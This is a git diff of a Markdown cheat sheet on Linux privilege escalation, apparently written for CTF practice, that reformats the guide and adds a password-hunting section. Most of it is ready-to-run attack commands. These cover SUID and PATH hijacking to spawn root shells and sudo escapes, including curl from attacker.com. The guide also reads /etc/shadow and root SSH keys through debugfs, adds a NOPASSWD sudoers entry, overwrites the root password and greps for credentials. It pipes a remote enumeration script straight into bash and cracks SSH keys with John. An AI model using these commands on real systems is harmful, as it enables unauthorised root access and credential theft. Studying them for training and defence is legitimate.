@@ -1,10 +1,11 @@
 
 <!-- TOC -->
-  - [Linux-Privilege-Escalation](#linux-privilege-escalation)
+- [Linux-Privilege-Escalation](#linux-privilege-escalation)
   - [Start with the basics](#start-with-the-basics)
   - [What can we EXECUTE?](#what-can-we-execute)
   - [What can we READ?](#what-can-we-read)
   - [Where can we WRITE?](#where-can-we-write)
+  - [Password Hunting](#password-hunting)
   - [Kernel Exploits](#kernel-exploits)
   - [Automated Linux Enumeration Scripts](#automated-linux-enumeration-scripts)
     - [LinEmum.sh](#linemumsh)
@@ -16,13 +17,13 @@
 
 <!-- /TOC -->
 
- # Linux-Privilege-Escalation
+# Linux-Privilege-Escalation
 
 Tips and Tricks for Linux Priv Escalation
 
 Fix the Shell:
 
-```
+```shell
 python -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl-Z
 
@@ -44,12 +45,33 @@ $ export TERM=xterm-256color
 
 ## Start with the basics
 
-Who am i and what groups do I belong to?
-  `id`
+Check **who** you are, which **privileges** do you have, which **users** are in the systems, which ones can **login** and which ones have **root privileges:**  
 
-Who else is on this box (lateral movement)?
-`ls -la /home`
-`cat /etc/passwd`
+  ```shell
+  #Info about me  Who am i and what groups do I belong to?
+  id || (whoami && groups) 2>/dev/null  
+  #List all users  
+  cat /etc/passwd | cut -d: -f1  
+  #List users with console  
+  cat /etc/passwd | grep "sh$"  
+  #List superusers  
+  awk -F: '($3 == "0") {print}' /etc/passwd  
+  #Currently logged users  
+  w  
+  #Login history  
+  last | tail  
+  #Last log of each user  
+  lastlog  
+  #List all users and their groups  
+  for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done
+  2>/dev/null | sort  
+  #Current user PGP keys  
+  gpg --list-keys 2&gt;/dev/null
+
+  #Who else is on this box (lateral movement)?
+  ls -la /home
+  cat /etc/passwd
+  ```
 
 What Kernel version and distro are we working with here?
   `uname -a`
@@ -57,7 +79,7 @@ What Kernel version and distro are we working with here?
 
 What new processes are running on the server (Thanks to IPPSEC for the script!):
 
-```
+```shell
 #!/bin/bash
 
 # Loop by line
@@ -72,32 +94,50 @@ while true; do
   old_process=$new_process
 done
 ```
-We can also use pspy on linux to monitor the processes that are starting up and running: https://github.com/DominicBreuker/pspy
+
+We can also use pspy on linux to monitor the processes that are starting up and running: <https://github.com/DominicBreuker/pspy>
 Check the services that are listening: `bash ss -lnpt`
 
 ## What can we EXECUTE?
 
-Who can execute code as root (probably will get a permission denied)? `cat /etc/sudoers`
-Can I execute code as root (you will need the user's password)? `sudo -l`
+Who can execute code as root (probably will get a permission denied)?
+  `cat /etc/sudoers`
+Can I execute code as root (you will need the user's password)?
+  `sudo -l`
 
 What executables have SUID bit that can be executed as another user?
-  `find / -type f -user root -perm /u+s -ls 2>/dev/null`
-  `find / -user root -perm -4000 -print 2>/dev/null`
-  `find / -perm -u=s -type f 2>/dev/null`
-  `find / -user root -perm -4000 -exec ls -ldb {} \;`
+
+  ```shell
+  find / -type f -user root -perm /u+s -ls 2>/dev/null
+  find / -user root -perm -4000 -print 2>/dev/null
+  find / -perm -u=s -type f 2>/dev/null
+  find / -user root -perm -4000 -exec ls -ldb {} \;
+  ```
+
+Do you have any capabilities available?
+
+  ```shell
+  getcap -r / 2>/dev/null
+  ```
 
 Do any of the SUID binaries run commands that are vulnerable to file path manipulation?
-  `strings /usr/local/bin/binaryelf`
-  `mail`
-  `echo "/bin/sh" > /tmp/mail` `cd /tmp`
-  `export PATH=.`
-  `/usr/local/bin/binaryelf`
+
+  ```shell
+  strings /usr/local/bin/binaryelf
+  mail
+  echo "/bin/sh" > /tmp/mail cd /tmp
+  export PATH=.
+  /usr/local/bin/binaryelf
+  ```
 
 Do any of the SUID binaries run commands that are vulnerable to Bash Function Manipulation?
-  `strings /usr/bin/binaryelf`
-  `mail` `function /usr/bin/mail() { /bin/sh; }`
-  `export -f /usr/bin/mail`
-  `/usr/bin/binaryelf`
+
+ ```shell
+  strings /usr/bin/binaryelf
+  mail function /usr/bin/mail() { /bin/sh; }
+  export -f /usr/bin/mail
+  /usr/bin/binaryelf
+  ```
 
 Can I write files into a folder containing a SUID bit file?
 Might be possible to take advantage of a '.' in the PATH or an The IFS (or Internal Field Separator) Exploit.
@@ -125,7 +165,7 @@ If any of the following commands appear on the list of SUID or SUDO commands, th
 | ash                                  |  sudo ash                                                                           |
 | sh                                   | |
 | csh                                  | |
-| curl                                 | URL=http://attacker.com/file_to_get <br> LFILE=file_to_save <br> sudo curl $URL -o $LFILE |
+| curl                                 | URL=<http://attacker.com/file_to_get> <br> LFILE=file_to_save <br> sudo curl $URL -o $LFILE |
 | dash                                 | |
 | pico                                 | sudo pico <br> ^R^X <br> reset; sh 1>&0 2>&0                                         |
 | nano                                 |  sudo nano <br> ^R^X <br> reset; sh 1>&0 2>&0                                        |
@@ -143,21 +183,23 @@ If any of the following commands appear on the list of SUID or SUDO commands, th
 | npm                                  |  ln -s /etc/shadow package.json && sudo /usr/bin/npm i *                            |
 | rsync                                |                                                                                     |
 | tar                                  |                                                                                     |
-|Screen-4.5.00 				| https://www.exploit-db.com/exploits/41154/					   |
+|Screen-4.5.00     | <https://www.exploit-db.com/exploits/41154/>        |
 
-_Note:_ You can find an incredible list of Linux binaries that can lead to privledge escalation at the GTFOBins project website here:<br>
-<https://gtfobins.github.io/>
+*Note:* You can find an incredible list of Linux binaries that can lead to privledge escalation at the GTFOBins project website here: <https://gtfobins.github.io/>
 
-Can I access services that are running as root on the local network?<br>
-`netstat -antup`<br>
-`ps -aux | grep root`
+Can I access services that are running as root on the local network?
+
+```shell
+netstat -antup
+ps -aux | grep root
+```
 
 | Network Services Running as Root      | Exploit actions                                                                     |
 |---------------------------------------|-------------------------------------------------------------------------------------|
 | mysql                                 | raptor_udf2 exploit<br> 0xdeadbeef.info/exploits/raptor_udf2.c <br> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));                   |
-| apache 			        | drop a reverse shell script on to the webserver                                     |
-| nfs	 			        | no_root_squash parameter <br>  Or <br> if you create the same user name and matching user id as the remote share you can gain access to the files and write new files to the share  |
-| PostgreSQL                            | https://www.exploit-db.com/exploits/45184/                                          |
+| apache            | drop a reverse shell script on to the webserver                                     |
+| nfs             | no_root_squash parameter <br>  Or <br> if you create the same user name and matching user id as the remote share you can gain access to the files and write new files to the share  |
+| PostgreSQL                            | <https://www.exploit-db.com/exploits/45184/>                                          |
 
 Are there any active tmux sessions we can connect to? `tmux ls`
 
@@ -173,9 +215,9 @@ Are there configuration files that contain credentials?
 |---------------------------------------|-------------------------------------------------------------------------------------|
 | WolfCMS <br> config.php               | // Database settings: <br> define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');<br> define('DB_USER', 'root');<br> define('DB_PASS', 'john@123');<br>        |
 | Generic PHP Web App                   | define('DB_PASSWORD', 's3cret');                                                     |
-| .ssh directory 		        | authorized_keys<br>id_rsa<br>id_rsa.keystore<br>id_rsa.pub<br>known_hosts            |
-| User MySQL Info	                | .mysql_history<br>.my.cnf						               |
-| User Bash History 	                | .bash_history                  					               |
+| .ssh directory           | authorized_keys<br>id_rsa<br>id_rsa.keystore<br>id_rsa.pub<br>known_hosts            |
+| User MySQL Info                 | .mysql_history<br>.my.cnf                     |
+| User Bash History                  | .bash_history                                      |
 
 Are any of the discovered credentials being reused by multiple acccounts?
   `sudo - username`
@@ -184,18 +226,27 @@ Are any of the discovered credentials being reused by multiple acccounts?
 Are there any Cron Jobs Running? `cat /etc/crontab`
 
 What files have been modified most recently?
-  `find /etc -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r`
-  `find /home -type f -mmin -60`
-  `find / -type f -mtime -2`
+
+  ```shell
+  find /etc -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r
+  find /home -type f -mmin -60
+  find / -type f -mtime -2
+  ```
 
 Is the user a member of the Disk group and can we read the contents of the file system?
-  `debugfs /dev/sda`
-  `debugfs: cat /root/.ssh/id_rsa`
-  `debugfs: cat /etc/shadow`
+  
+  ```shell
+  debugfs /dev/sda
+  debugfs: cat /root/.ssh/id_rsa
+  debugfs: cat /etc/shadow
+  ```
 
 Is the user a member of the Video group and can we read the Framebuffer?
-  `cat /dev/fb0 > /tmp/screen.raw`
-  `cat /sys/class/graphics/fb0/virtual_size`
+  
+  ```shell
+  cat /dev/fb0 > /tmp/screen.raw
+  cat /sys/class/graphics/fb0/virtual_size
+  ```
 
 ## Where can we WRITE?
 
@@ -212,25 +263,42 @@ What folder can I write to?
 
 _Root SSH Key_ If Root can login via SSH, then you might be able to find a method of adding a key to the /root/.ssh/authorized_keys file.
 
-```
-cat /etc/ssh/sshd_config | grep PermitRootLogin
-```
+`cat /etc/ssh/sshd_config | grep PermitRootLogin`
 
 _Add SUDOers_ If we can write arbitrary files to the host as Root, it is possible to add users to the SUDO-ers group like so (NOTE: you will need to logout and login again as myuser):<br>
 /etc/sudoers
 
-```
+```shell
 root    ALL=(ALL:ALL) ALL
 %sudo   ALL=(ALL:ALL) ALL
 myuser    ALL=(ALL) NOPASSWD:ALL
 ```
 
-_Set Root Password_ We can also change the root password on the host if we can write to any file as root:<br>
-/etc/shadow
+_Set Root Password_ We can also change the root password on the host if we can write to any file as root:`/etc/shadow`
 
-```
+```shell
 printf root:>shadown
 openssl passwd -1 -salt salty password >>shadow
+```
+
+## Password Hunting
+
+```shell
+grep --color=auto -rnw ‘/’ -ie “PASSWORD” --color=always 2>/dev/null  
+grep --color=auto -rnw ‘/’ -ie “PASSWORD=” --color=always 2>/dev/null  
+```
+
+<https://linuxcommando.blogspot.com/2007/10/grep-with-color-output.html>  
+
+```shell
+locate password | more  
+locate passw | more  
+locate pass | more  
+```
+
+```shell
+find / -name authorized_keys  
+find / -name id_rsa 2>/dev/null  
 ```
 
 ## Kernel Exploits
@@ -291,19 +359,19 @@ This has helped me to find interesting files on a few different CTF machines.
 
 Recursively searching for passwords is also a handy technique:
 
-```
+```shell
 grep -ri "passw" .
 ```
 
 Wget Pipe a remote URL directory to Bash (linpeas):
 
-```
+```shell
 wget -q -O - "http://10.10.10.10/linpeas.sh" | bash
 ```
 
 Curl Pipe a remote URL directly to Bash (linpeas):
 
-```
+```shell
 curl -sSk "http://10.10.10.10/linpeas.sh" | bash
 ```
 
@@ -313,14 +381,14 @@ Often, we are provided with password protected SSH keys on CTF boxes. It it help
 
 First we need to convert the ssh key using John:
 
-```
+```shell
 kali@kali:~/.ssh$ /usr/share/john/ssh2john.py ./id_rsa > ./id_rsa_john
 ...
 ```
 
 Next we will need to use that format to crack the password:
 
-```
+```shell
 /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa_john
 ```
 
